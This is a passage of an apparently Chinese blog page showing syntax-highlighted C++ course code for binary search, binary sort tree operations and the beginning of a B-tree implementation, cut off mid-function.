class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1;</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">int</span> key;<span class="hljs-comment">//关键字域</span><br>&#125;ElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ElemType *R;<br><span class="hljs-type">int</span> length;<br>&#125;SSTable;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitList_SSTable</span><span class="hljs-params">(SSTable &amp;L)</span><br>&#123;<br>L.R = new ElemType[MAXSIZE];<br><span class="hljs-keyword">if</span> (!L.R)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;初始化错误&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>L.length = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Insert_SSTable</span><span class="hljs-params">(SSTable &amp;L)</span><br>&#123;<br><span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; MAXSIZE; i++)<br>&#123;<br>L.R[i].key = j;<br>L.length++;<br>j++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Search_Bin</span><span class="hljs-params">(SSTable ST, <span class="hljs-type">int</span> key)</span> &#123;<br><span class="hljs-comment">// 在有序表ST中折半查找其关键字等于key的数据元素。若找到，则函数值为</span><br><span class="hljs-comment">// 该元素在表中的位置，否则为0</span><br><span class="hljs-type">int</span> low = <span class="hljs-number">1</span>, high = ST.length;<span class="hljs-comment">//置查找区间初值</span><br><span class="hljs-type">int</span>  mid;<br><span class="hljs-keyword">while</span> (low &lt;= high) &#123;<br>mid = (low + high) / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (key == ST.R[mid].key)  <span class="hljs-keyword">return</span> mid;      <span class="hljs-comment">//找到待查元素</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &lt; ST.R[mid].key)  high = mid - <span class="hljs-number">1</span>;<span class="hljs-comment">//继续在前一子表进行查找</span><br><span class="hljs-keyword">else</span>  low = mid + <span class="hljs-number">1</span>;                       <span class="hljs-comment">//继续在后一子表进行查找</span><br>&#125;<span class="hljs-comment">//while</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//表中不存在待查元素</span><br>&#125;<span class="hljs-comment">// Search_Bin</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Show_End</span><span class="hljs-params">(<span class="hljs-type">int</span> result, <span class="hljs-type">int</span> testkey)</span><br>&#123;<br><span class="hljs-keyword">if</span> (result == <span class="hljs-number">0</span>)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;未找到&quot;</span> &lt;&lt; testkey &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;找到&quot;</span> &lt;&lt; testkey &lt;&lt; <span class="hljs-string">&quot;位置为&quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SSTable ST;<br>InitList_SSTable(ST);<br>Insert_SSTable(ST);<br><span class="hljs-type">int</span> testkey1 = <span class="hljs-number">7</span>, testkey2 = <span class="hljs-number">200</span>;<br><span class="hljs-type">int</span> result;<br>result = Search_Bin(ST, testkey1);<br>Show_End(result, testkey1);<br>result = Search_Bin(ST, testkey2);<br>Show_End(result, testkey2);<br>&#125;<br></code></pre></td></tr></table></figure><h1>二叉排序树</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ENDFLAG <span class="hljs-string">&#x27;#&#x27;</span></span><br><span class="hljs-comment">//char a[10]=&#123;&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;9&#x27;,&#x27;8&#x27;,&#x27;10&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;#&#x27;&#125;;//全局变量</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ElemType</span> &#123;</span><br><span class="hljs-type">char</span> key;<br>&#125;ElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BSTNode</span> &#123;</span><br>ElemType data;<span class="hljs-comment">//结点数据域</span><br>BSTNode *lchild, *rchild;<span class="hljs-comment">//左右孩子指针</span><br>&#125;BSTNode, *BSTree;<br><br><br><span class="hljs-comment">//二叉排序树的递归查找</span><br>BSTree <span class="hljs-title function_">SearchBST</span><span class="hljs-params">(BSTree T, <span class="hljs-type">char</span> key)</span> &#123;<br><span class="hljs-comment">//在根指针T所指二叉排序树中递归地查找某关键字等于key的数据元素</span><br><span class="hljs-comment">//若查找成功，则返回指向该数据元素结点的指针，否则返回空指针</span><br><span class="hljs-keyword">if</span> ((!T) || key == T-&gt;data.key) <span class="hljs-keyword">return</span> T;                   <span class="hljs-comment">//查找结束</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &lt; T-&gt;data.key)  <span class="hljs-keyword">return</span> SearchBST(T-&gt;lchild, key);<span class="hljs-comment">//在左子树中继续查找</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> SearchBST(T-&gt;rchild, key);       <span class="hljs-comment">//在右子树中继续查找</span><br>&#125; <span class="hljs-comment">// SearchBST</span><br><br><br><br><span class="hljs-comment">//二叉排序树的插入</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertBST</span><span class="hljs-params">(BSTree &amp;T, ElemType e)</span> &#123;<br><span class="hljs-comment">//当二叉排序树T中不存在关键字等于e.key的数据元素时，则插入该元素</span><br><span class="hljs-keyword">if</span> (!T) &#123;                <span class="hljs-comment">//找到插入位置，递归结束</span><br>BSTree S = new BSTNode;            <span class="hljs-comment">//生成新结点*S</span><br>S-&gt;data = e;                  <span class="hljs-comment">//新结点*S的数据域置为e   </span><br>S-&gt;lchild = S-&gt;rchild = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//新结点*S作为叶子结点</span><br>T = S;            <span class="hljs-comment">//把新结点*S链接到已找到的插入位置</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.key &lt; T-&gt;data.key)<br>InsertBST(T-&gt;lchild, e);<span class="hljs-comment">//将*S插入左子树</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.key &gt; T-&gt;data.key)<br>InsertBST(T-&gt;rchild, e);<span class="hljs-comment">//将*S插入右子树</span><br>&#125;<span class="hljs-comment">// InsertBST</span><br><br><br><br><span class="hljs-comment">//二叉排序树的创建</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateBST</span><span class="hljs-params">(BSTree &amp;T)</span> &#123;<br><span class="hljs-comment">//依次读入一个关键字为key的结点，将此结点插入二叉排序树T中</span><br>T = <span class="hljs-literal">NULL</span>;<br>ElemType e;<br><span class="hljs-built_in">cin</span> &gt;&gt; e.key;        <span class="hljs-comment">//???</span><br><span class="hljs-keyword">while</span> (e.key != ENDFLAG) &#123;   <span class="hljs-comment">//ENDFLAG为自定义常量，作为输入结束标志</span><br>InsertBST(T, e);          <span class="hljs-comment">//将此结点插入二叉排序树T中</span><br><span class="hljs-built_in">cin</span> &gt;&gt; e.key;<span class="hljs-comment">//???</span><br>&#125;<span class="hljs-comment">//while            </span><br>&#125;<span class="hljs-comment">//CreatBST</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DeleteBST</span><span class="hljs-params">(BSTree &amp;T, <span class="hljs-type">char</span> key)</span> &#123;<br><span class="hljs-comment">//从二叉排序树T中删除关键字等于key的结点</span><br>BSTree p = T; BSTree f = <span class="hljs-literal">NULL</span>;                     <span class="hljs-comment">//初始化</span><br>BSTree q=<span class="hljs-literal">NULL</span>;<span class="hljs-comment">//change</span><br>BSTree s;<br><span class="hljs-comment">/*------------下面的while循环从根开始查找关键字等于key的结点*p-------------*/</span><br><span class="hljs-keyword">while</span> (p) &#123;<br><span class="hljs-keyword">if</span> (p-&gt;data.key == key) <span class="hljs-keyword">break</span>;        <span class="hljs-comment">//找到关键字等于key的结点*p，结束循环</span><br>f = p;                                <span class="hljs-comment">//*f为*p的双亲结点</span><br><span class="hljs-keyword">if</span> (p-&gt;data.key &gt; key)  p = p-&gt;lchild;     <span class="hljs-comment">//在*p的左子树中继续查找</span><br><span class="hljs-keyword">else</span> p = p-&gt;rchild;                    <span class="hljs-comment">//在*p的右子树中继续查找</span><br>&#125;<span class="hljs-comment">//while</span><br><span class="hljs-keyword">if</span> (!p) <span class="hljs-keyword">return</span>;                         <span class="hljs-comment">//找不到被删结点则返回</span><br><span class="hljs-comment">/*―考虑三种情况实现p所指子树内部的处理：*p左右子树均不空、无右子树、无左子树―*/</span><br><span class="hljs-keyword">if</span> ((p-&gt;lchild) &amp;&amp; (p-&gt;rchild)) &#123;     <span class="hljs-comment">//被删结点*p左右子树均不空</span><br>q = p;<br>s = p-&gt;lchild;<br><span class="hljs-keyword">while</span> (s-&gt;rchild)                <span class="hljs-comment">//在*p的左子树中继续查找其前驱结点，即最右下结点</span><br>&#123;<br>q = s; s = s-&gt;rchild;<br>&#125;         <span class="hljs-comment">//向右到尽头</span><br>p-&gt;data = s-&gt;data;               <span class="hljs-comment">//s指向被删结点的“前驱”</span><br><span class="hljs-keyword">if</span> (q != p) &#123;<br>q-&gt;rchild = s-&gt;lchild;     <span class="hljs-comment">//重接*q的右子树</span><br>&#125;<br><span class="hljs-keyword">else</span> q-&gt;lchild = s-&gt;lchild;        <span class="hljs-comment">//重接*q的左子树</span><br>delete s;<br>&#125;<span class="hljs-comment">//if</span><br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (!p-&gt;rchild) &#123;               <span class="hljs-comment">//被删结点*p无右子树，只需重接其左子树</span><br>q = p; p = p-&gt;lchild;<br>&#125;<span class="hljs-comment">//else if</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!p-&gt;lchild) &#123;               <span class="hljs-comment">//被删结点*p无左子树，只需重接其右子树</span><br>q = p; p = p-&gt;rchild;<br>&#125;<span class="hljs-comment">//else if</span><br>  <span class="hljs-comment">/*――――――――――将p所指的子树挂接到其双亲结点*f相应的位置――――――――*/</span><br><span class="hljs-keyword">if</span> (!f) T = p;                       <span class="hljs-comment">//被删结点为根结点</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q == f-&gt;lchild) f-&gt;lchild = p;   <span class="hljs-comment">//挂接到*f的左子树位置</span><br><span class="hljs-keyword">else</span> f-&gt;rchild = p;                 <span class="hljs-comment">//挂接到*f的右子树位置</span><br>delete q;<br>&#125;<br>&#125;<span class="hljs-comment">//DeleteBST</span><br><br><span class="hljs-comment">//二叉排序树的删除</span><br><br><span class="hljs-comment">//中序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrderTraverse</span><span class="hljs-params">(BSTree &amp;T)</span><br>&#123;<br><span class="hljs-keyword">if</span> (T)<br>&#123;<br>InOrderTraverse(T-&gt;lchild);<br><span class="hljs-built_in">cout</span> &lt;&lt; T-&gt;data.key;<br>InOrderTraverse(T-&gt;rchild);<br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>BSTree T;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入若干字符，用回车区分，以#结束输入&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>CreateBST(T);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;当前有序二叉树中序遍历结果为&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>InOrderTraverse(T);<br><span class="hljs-type">char</span> key;<span class="hljs-comment">//待查找或待删除内容</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入待查找字符&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; key;<br>BSTree result = SearchBST(T, key);<br><span class="hljs-keyword">if</span> (result)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;找到字符&quot;</span> &lt;&lt; key &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;未找到&quot;</span> &lt;&lt; key &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入待删除的字符&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; key;<br>DeleteBST(T, key);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;当前有序二叉树中序遍历结果为&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>InOrderTraverse(T);<br>&#125;<br></code></pre></td></tr></table></figure><h1>B-树</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FALSE 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRUE 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> m 3<span class="hljs-comment">//B-树的阶，暂设为3</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span> &#123;</span><br><span class="hljs-type">int</span> keynum;<span class="hljs-comment">//结点中关键字的个数，即结点的大小</span><br>BTNode *parent;<span class="hljs-comment">//指向双亲结点</span><br><span class="hljs-type">int</span> key[m + <span class="hljs-number">1</span>];<span class="hljs-comment">//关键字矢量，0号单元未用</span><br>BTNode *ptr[m + <span class="hljs-number">1</span>];<span class="hljs-comment">//子树指针矢量</span><br>&#125;BTNode, *BTree;<br><br><span class="hljs-comment">//- - - - - B-树的查找结果类型定义- - - - -</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Result</span> &#123;</span><br>BTNode *pt;     <span class="hljs-comment">//指向找到的结点</span><br><span class="hljs-type">int</span> i;           <span class="hljs-comment">//1..m，在结点中的关键字序号</span><br><span class="hljs-type">int</span> tag;         <span class="hljs-comment">//1：查找成功，0：查找失败</span><br>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Search</span><span class="hljs-params">(BTree T, <span class="hljs-type">int</span> key)</span><br>&#123;<br>BTree p = T;<br><span class="hljs-type">int</span> endnum;<br><span class="hljs-keyword">if</span> (p)<span class="hljs-comment">//树不为空时</span><br>&#123;<br>endnum = p-&gt;keynum;<span class="hljs-comment">//获得首节点包含的记录个数</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//返回没找到</span><br>&#125;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (endnum == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> i;<span class="hljs-comment">//树存在，但仅有一个为空根节点</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &gt;= p-&gt;key[endnum])<span class="hljs-comment">//节点不为空，但当前值比最大的key还大</span><br>&#123;<br>i = endnum;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &lt;= p-&gt;key[<span class="hljs-number">1</span>])<span class="hljs-comment">//节点不为空，但当前值比最小的key还小</span><br>&#123;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; endnum; i++)<span class="hljs-comment">//有合适的位置，即处于当前结点的最大和最小值之间，或找到了</span><br>&#123;<br><span class="hljs-keyword">if</span> (p-&gt;key[i] &lt;= key &amp;&amp; key &lt; p-&gt;key[i + <span class="hljs-number">1</span>])<br><span class="hljs-keyword">return</span> i;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(BTree &amp;q, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> x, BTree &amp;ap)</span><br>&#123;<span class="hljs-comment">//将x插入q结点的i+1位置中</span><br><span class="hljs-type">int</span> j;<br><span class="hljs-keyword">for</span> (j = m - <span class="hljs-number">1</span>; j &gt; i; j--)<br>&#123;<br><span class="hljs-comment">//将插入位置之后的key全部后移一位</span><br>q-&gt;key[j + <span class="hljs-number">1</span>] = q-&gt;key[j];<br>&#125;<br><span class="hljs-keyword">for</span> (j = m; j &gt; i; j--)<br>&#123;<br><span class="hljs-comment">//相应地也移动其后ptr的位置</span><br>q-&gt;ptr[j] = q-&gt;ptr[j - <span class="hljs-number">1</span>];<br>&#125;<br>q-&gt;key[i + <span class="hljs-number">1</span>] = x;<span class="hljs-comment">//插入x到该位置</span><br>q-&gt;ptr[i + <span class="hljs-number">1</span>] = ap;<br>q-&gt;keynum++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">split</span><span class="hljs-params">(BTree &amp;q, <span class="hljs-type">int</span> s, BTree &amp;ap)</span><br>&#123;<span class="hljs-comment">//将q-&gt;key[s+1,..,m], q-&gt;ptr[s+1,..,m]移入新结点*ap作为右结点</span><br><span class="hljs-comment">//原结点作为新的左侧结点</span><br><span class="hljs-comment">//中间值被保存在ap[0]-&gt;key中，等待找到跳转回InsertBTree（）寻找到到合适的插入位置插入</span><br><span class="hljs-type">int</span> i;<br>ap = new BTNode;<br><span class="hljs-keyword">for</span> (i = s + <span class="hljs-number">1</span>; i &lt;= m; i++)<br>&#123;<span class="hljs-comment">//将q-&gt;key[s+1,..,m]保存到ap-&gt;key[0,..,m-s+1]中</span><br><span class="hljs-comment">//将q-&gt;ptr[s+1,..,m]保存到ap-&gt;ptr[0,..,m-s+1]中</span><br>ap-&gt;key[i - s - <span class="hljs-number">1</span>] = q-&gt;key[i];<br>ap-&gt;ptr[i - s - <span class="hljs-number">1</span>] = q-&gt;ptr[i];<br>&#125;<br><span class="hljs-keyword">if</span> (ap-&gt;ptr[<span class="hljs-number">0</span>])<br>&#123;<br><span class="hljs-comment">//当ap有子树的时候</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1</span>; i++)<br>&#123;<br><span class="hljs-comment">//将ap的子树的父亲改为ap自己</span><br>ap-&gt;ptr[i]-&gt;parent = ap;<br>&#125;<br>&#125;<br>ap-&gt;keynum = (m - s) - <span class="hljs-number">1</span>;<br>ap-&gt;parent = q-&gt;parent;<span class="hljs-comment">//将ap的父亲改为q的父亲</span><br><br>q-&gt;keynum = q-&gt;keynum - (m - s);<span class="hljs-comment">//修改q的记录个数</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">NewRoot</span><span class="hljs-params">(BTree &amp;T, BTree q, <span class="hljs-type">int</span> x, BTree &amp;ap)</span><span class="hljs-comment">//生成含信息（T, x, ap）的新的根结点*T，原T和ap为子树指针</span><br>&#123;<br>BTree newT = 